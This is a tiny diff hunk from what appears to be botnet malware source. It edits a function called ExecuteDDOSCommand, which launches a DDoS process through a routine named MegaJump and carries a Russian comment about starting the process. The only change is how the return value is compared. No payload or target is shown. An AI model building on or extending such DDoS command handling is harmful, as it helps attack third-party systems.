@@ -120,7 +120,7 @@ bool ExecuteDDOSCommand(LPVOID Manager, PCHAR Command, PCHAR Args)
 
 
 	// Запускаем процесс
-	return MegaJump(DDOSProces);
+	return MegaJump(DDOSProces) == TRUE;
 
 //	return (StartThread(DDOSProces, NULL)) ? true : false;
 }
